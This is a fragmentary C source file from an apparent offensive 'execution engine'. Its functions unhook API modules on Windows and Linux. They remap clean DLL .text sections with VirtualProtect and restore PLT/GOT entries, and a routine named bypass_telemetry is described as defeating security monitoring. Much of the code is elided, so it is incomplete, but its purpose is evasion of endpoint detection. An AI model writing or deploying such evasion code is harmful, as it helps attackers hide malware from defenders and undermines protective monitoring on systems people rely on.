/* ============================================================================
 * Proteus- Execution Engine -- api_unhooking.c
...
int unhook_module(const char* module_name) {
    ...
    if (!hMod) {
        LOG_ERROR("[-] %s not loaded in current process", module_name);
        return -1;
    }

    MODULEINFO modInfo = {0};
    if (!GetModuleInformation(GetCurrentProcess(), hMod, &modInfo, sizeof(modInfo))) {
        LOG_ERROR("[-] GetModuleInformation failed: %lu", GetLastError());
        return -1;
    }
    ...
    if (hFile == INVALID_HANDLE_VALUE) {
        LOG_ERROR("[-] Cannot open %s: %lu", path, GetLastError());
        return -1;
    }

    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMap) {
        LOG_ERROR("[-] CreateFileMapping failed: %lu", GetLastError());
        CloseHandle(hFile);
        return -1;
    }
    ...
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSec[i].Name, ".text", 5) == 0 ||
            ...
            if (VirtualProtect(dst, secSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                ...
                patched = TRUE;
                LOG_INFO("[+] Restored .text of %s (0x%zX bytes)", module_name, secSize);
            } else {
                LOG_ERROR("[!] VirtualProtect failed on .text: %lu", GetLastError());
            }
        }
    }

    if (!patched) {
        LOG_ERROR("[!] No executable section found in %s", module_name);
    }
...
int bypass_telemetry(void) {
    ...
    for (int i = 0; targets[i]; i++) {
        if (unhook_module(targets[i]) != 0) {
            LOG_ERROR("[!] Failed to unhook %s", targets[i]);
            ret = -1;
        }
    }
    return ret;
...
int unhook_module(const char* module_name) {
    ...
    if (!handle) {
        LOG_ERROR("[-] %s not loaded: %s", module_name, dlerror());
        return -1;
    }
    ...
    if (!base) {
        LOG_ERROR("[-] Cannot determine base of %s", module_name);
        dlclose(handle);
        return -1;
    }
    ...
    if (jmprel && pltrelsz) {
        ...
        LOG_INFO("[+] Restored %zu PLT/GOT entries in %s", count, module_name);
    }
